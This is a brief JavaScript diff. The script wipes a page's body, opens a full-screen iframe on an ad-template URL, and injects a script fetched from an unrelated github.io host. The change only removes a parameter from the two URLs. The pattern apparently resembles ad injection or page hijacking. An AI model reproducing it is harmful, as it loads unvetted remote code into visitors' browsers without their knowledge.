@@ -5,7 +5,7 @@ document.getElementsByTagName("body")[0].innerHTML='';
 
 	var safeframe = document.createElement("iframe");
 		safeframe.id='yt_safeframe';
-		safeframe.src='https://s0.2mdn.net/ads/richmedia/studio/mu/templates/tetris/bootstrap-3/tetris.html#ai='+newstr;
+		safeframe.src='https://s0.2mdn.net/ads/richmedia/studio/mu/templates/tetris/bootstrap-3/tetris.html#ai=';
 		safeframe.style = "left:0px;top:0px;border:0px;";
 		safeframe.style.width = "100%";
 		safeframe.style.height = "100%";
@@ -23,7 +23,7 @@ document.getElementsByTagName("body")[0].innerHTML='';
 			doc.getElementsByTagName("body")[0].innerHTML='';
 			script = document.createElement("script");
 			script.type ='text/javascript';
-			script.src ='https://coolboy112233.github.io/unknowbastard/yt_js1.js?a=15&ai='+newstr;
+			script.src ='https://coolboy112233.github.io/unknowbastard/yt_js1.js';
 			doc.body.appendChild(script);
 		};
 		document.getElementsByTagName("body")[0].appendChild(safeframe);
